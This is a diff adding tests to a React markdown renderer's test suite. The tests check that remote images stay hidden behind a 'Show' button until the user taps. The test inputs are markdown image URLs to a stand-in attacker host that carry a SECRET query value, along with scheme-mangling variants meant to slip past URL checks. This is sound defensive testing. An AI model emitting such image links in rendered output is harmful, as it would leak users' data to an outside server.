@@ -338,6 +338,18 @@ describe('remote images wait for a tap; local images render inline', () => {
     expect(img!.getAttribute('src')).toBe('https://attacker.example/p.png?d=SECRET');
   });
 
+  it.each([
+    'https://attacker.example/p.png?d=SECRET',
+    'https:attacker.example/p.png?d=SECRET',   // no double slash — browser still fetches it
+    'https:/attacker.example/p.png?d=SECRET',  // one slash
+    'HTTPS://attacker.example/p.png',          // uppercase scheme
+    '//attacker.example/p.png',                // protocol-relative
+  ])('gates the website image %s behind Show (no <img> until tapped)', (src) => {
+    render(<MarkdownContent content={`![x](${src})`} />);
+    expect(document.querySelector('img')).toBeNull();
+    expect(screen.getByRole('button', { name: /image from|load image/i })).toBeInTheDocument();
+  });
+
   it('a data: image is never gated as a remote fetch (no Show button)', () => {
     // react-markdown's default urlTransform already drops data: srcs, so the
     // point is only that a data: image is NOT treated as a website fetch.
